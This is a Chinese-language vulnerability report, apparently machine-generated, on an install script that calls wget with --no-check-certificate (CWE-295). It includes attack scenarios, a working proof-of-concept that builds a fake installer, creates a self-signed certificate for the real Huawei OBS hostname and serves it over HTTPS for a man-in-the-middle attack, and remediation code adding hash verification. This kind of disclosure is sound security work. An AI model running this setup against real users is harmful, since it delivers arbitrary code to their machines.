# VULN-INSTALL-001：证书验证绕过漏洞

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **ID** | VULN-INSTALL-001 |
| **CWE** | CWE-295: Improper Certificate Validation |
| **严重等级** | High |
| **置信度** | 85 |
| **文件** | scripts/install_pto.sh |
| **行号** | 123 |
| **函数** | download_pto_isa_run |

## 漏洞描述

脚本在 `wget` 下载命令中使用 `--no-check-certificate` 标志，**禁用了 SSL/TLS 证书验证**。这使得攻击者能够通过中间人攻击拦截或篡改下载的软件包，即使服务器配置了 HTTPS。

## 可达性分析

### 漏洞代码

```bash
# Line 123
if wget -O "$PTO_ISA_PKG" "$url" --no-check-certificate -q; then
```

### 执行路径

```
main()
  └── download_pto_isa_run(arch)
        └── wget -O "$PTO_ISA_PKG" "$url" --no-check-certificate -q
                    ↑
                    漏洞点: 禁用证书验证
```

### 触发条件

1. 用户执行安装脚本
2. 脚本尝试从华为 OBS 服务器下载 `.run` 安装包
3. 无论服务器是否启用 HTTPS，客户端都会接受任何证书

### 与 VULN-INSTALL-003 的关系

| 特性 | VULN-INSTALL-001 | VULN-INSTALL-003 |
|------|------------------|------------------|
| CWE | CWE-295 (证书验证) | CWE-494 (完整性检查) |
| 根本问题 | 禁用 TLS 证书验证 | 无 hash/签名校验 |
| 协议影响 | 影响所有 HTTPS 连接 | 影响所有下载 |
| 独立存在 | 是，即使 URL 为 HTTPS 也有效 | 是，HTTP 协议使攻击更容易 |
| 严重程度 | High | Critical |

**注意**: 两个漏洞相互独立但又协同放大风险。即使修复了 HTTP → HTTPS (VULN-003)，`--no-check-certificate` 仍然允许 MITM 攻击。

## 攻击链构建

### 攻击场景 1: 自签名证书攻击

```
┌─────────────────────────────────────────────────────────────────────┐
│ 攻击者设置恶意 HTTPS 服务器                                         │
├─────────────────────────────────────────────────────────────────────┤
│ 1. 生成自签名证书                                                   │
│    openssl req -x509 -newkey rsa:2048 -keyout key.pem \             │
│                 -out cert.pem -days 365 -nodes                      │
│                                                                     │
│ 2. 搭建 HTTPS 服务器返回恶意软件包                                   │
│    python3 -c "import http.server, ssl; \                          │
│                server = http.server.HTTPServer(('', 443), \        │
│                         http.server.SimpleHTTPRequestHandler); \    │
│                server.socket = ssl.wrap_socket(server.socket, \    │
│                         certfile='cert.pem', keyfile='key.pem'); \  │
│                server.serve_forever()"                              │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│ MITM 劫持 (DNS 欺骗 / ARP 欺骗 / BGP 劫持)                          │
├─────────────────────────────────────────────────────────────────────┤
│ 受害者请求 → 攻击者服务器 (自签名证书)                               │
│                                                                     │
│ 正常情况下:                                                         │
│ wget → ERROR: certificate common name doesn't match                │
│                                                                     │
│ 由于 --no-check-certificate:                                        │
│ wget → 接受自签名证书 → 下载恶意文件                                 │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│ 恶意代码执行                                                        │
├─────────────────────────────────────────────────────────────────────┤
│ chmod +x "$PTO_ISA_PKG"                                             │
│ "$PTO_ISA_PKG" --full --quiet --install-path="$install_path"       │
│                                                                     │
│ 恶意载荷以用户权限执行                                               │
└─────────────────────────────────────────────────────────────────────┘
```

### 攻击场景 2: 证书替换攻击

```
┌─────────────────────────────────────────────────────────────────────┐
│ 攻击者获取合法域名的证书                                             │
├─────────────────────────────────────────────────────────────────────┤
│ 方法:                                                               │
│ • 社会工程攻击证书颁发机构                                           │
│ • 利用证书颁发机构漏洞                                               │
│ • 入侵华为 OBS 基础设施                                             │
│ • 利用 Let's Encrypt 自动签发                                       │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│ 即使有合法证书，攻击者也能替换内容                                   │
├─────────────────────────────────────────────────────────────────────┤
│ 由于 --no-check-certificate，客户端不会验证:                        │
│ • 证书颁发机构是否受信任                                             │
│ • 证书是否过期                                                      │
│ • 证书域名是否匹配                                                  │
│ • 证书是否被吊销                                                    │
└─────────────────────────────────────────────────────────────────────┘
```

## 实际影响评估

### 影响范围

| 影响维度 | 评估 |
|----------|------|
| 保密性 | 高 - 攻击者可查看所有下载内容 |
| 完整性 | 高 - 攻击者可修改下载内容 |
| 可用性 | 中 - 攻击者可阻止下载 |

### 与完整攻击链的关系

```
VULN-INSTALL-001 (--no-check-certificate)
        │
        ├── 单独利用: 攻击者使用自签名证书的 HTTPS 服务器
        │
        └── 与 VULN-INSTALL-003 结合:
                    │
                    ├── HTTP 协议 → 无需证书攻击
                    │
                    └── HTTPS 协议 + --no-check-certificate → 任意证书被接受
```

### 防护绕过分析

即使服务器配置了 HTTPS：

| 安全机制 | 正常行为 | 使用 --no-check-certificate |
|----------|----------|------------------------------|
| 证书域名验证 | 验证证书 CN/SAN 匹配请求域名 | 跳过 |
| 证书链验证 | 验证到受信任根 CA | 跳过 |
| 证书有效期 | 验证 notBefore/notAfter | 跳过 |
| 证书吊销 | 检查 CRL/OCSP | 跳过 |
| HSTS | 强制 HTTPS 重定向 | 无效（已接受恶意证书）|

## PoC 可行性判断

### 技术可行性: **高**

```bash
#!/bin/bash
# PoC: 演示 --no-check-certificate 的危险性

# 1. 创建恶意服务器目录
mkdir -p /tmp/fake_server/package/cann/pto-isa/version_compile/master/202604/2204/
cd /tmp/fake_server

# 2. 创建恶意 .run 文件
cat > payload.sh << 'EOF'
#!/bin/bash
echo "[!] CERTIFICATE BYPASS POC - Code executed!"
id
EOF
makeself --sha256 payload.sh malicious.run "Fake PTO ISA" ./payload.sh
mv malicious.run package/cann/pto-isa/version_compile/master/202604/2204/cann-pto-isa_8.5.0_linux-x86_64.run

# 3. 使用自签名证书启动 HTTPS 服务器
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
  -days 1 -nodes -subj "/CN=container-obsfs-filesystem.obs.cn-north-4.myhuaweicloud.com"

python3 << 'PYEOF'
import http.server
import ssl

server = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
server.socket = ssl.wrap_socket(server.socket, certfile='cert.pem', keyfile='key.pem', server_side=True)
print("Malicious HTTPS server running on port 443 with self-signed cert")
server.serve_forever()
PYEOF

# 4. 受害者机器 - 修改 /etc/hosts 或 DNS
# 127.0.0.1 container-obsfs-filesystem.obs.cn-north-4.myhuaweicloud.com

# 5. 执行原安装脚本
# wget 将接受自签名证书，下载恶意文件
```

### 演示验证

```bash
# 正常 wget 行为（证书验证启用）
$ wget https://self-signed.badssl.com/
ERROR: cannot verify self-signed.badssl.com's certificate

# 使用 --no-check-certificate 的行为
$ wget https://self-signed.badssl.com/ --no-check-certificate
# 下载成功，无警告
```

## 修复建议

### 立即修复 (Critical)

```bash
# 移除 --no-check-certificate 标志
-if wget -O "$PTO_ISA_PKG" "$url" --no-check-certificate -q; then
+if wget -O "$PTO_ISA_PKG" "$url" -q; then
```

### 如果必须使用自签名证书 (不推荐)

```bash
# 使用 --ca-certificate 指定受信任的 CA 证书
wget -O "$PTO_ISA_PKG" "$url" --ca-certificate=/path/to/trusted-ca.crt -q
```

### 完整修复方案

```bash
download_pto_isa_run() {
  local arch="$1"
  # 1. 使用 HTTPS
  local base_url="https://container-obsfs-filesystem.obs.cn-north-4.myhuaweicloud.com/package/cann/pto-isa/version_compile/master/${CURRENT_YEAR}${CURRENT_MONTH}"
  
  # ... 省略日期逻辑 ...
  
  for date in "${try_dates[@]}"; do
    local url="${base_url}/${date}/ubuntu_${arch}/${filename}"
    
    # 2. 启用证书验证
    if wget -O "$PTO_ISA_PKG" "$url" -q; then
      
      # 3. 添加完整性校验
      local expected_hash="<预先发布的 hash>"
      local actual_hash=$(sha256sum "$PTO_ISA_PKG" | awk '{print $1}')
      
      if [[ "$actual_hash" != "$expected_hash" ]]; then
        error "Hash mismatch! Expected: $expected_hash, Got: $actual_hash"
        rm -f "$PTO_ISA_PKG"
        continue
      fi
      
      info "download successful! Integrity verified."
      return 0
    fi
  done
}
```

## 判定结论

| 项目 | 结果 |
|------|------|
| 是否为真实漏洞 | **是** |
| 漏洞类型 | CWE-295: Improper Certificate Validation |
| 可利用性 | 高 (需要 MITM 位置) |
| 影响 | High (与 VULN-003 协同放大风险) |
| PoC 可行性 | 高 |
| 独立存在 | 是 (即使修复 HTTP → HTTPS，此漏洞仍有效) |

## 关联漏洞

- **VULN-INSTALL-003**: CWE-494 Download of Code Without Integrity Check
  - 两个漏洞在同一代码位置
  - 建议同时修复
  - VULN-001 使 VULN-003 的利用更容易

---

**报告生成时间**: 2026-04-22
**分析者**: details-analyzer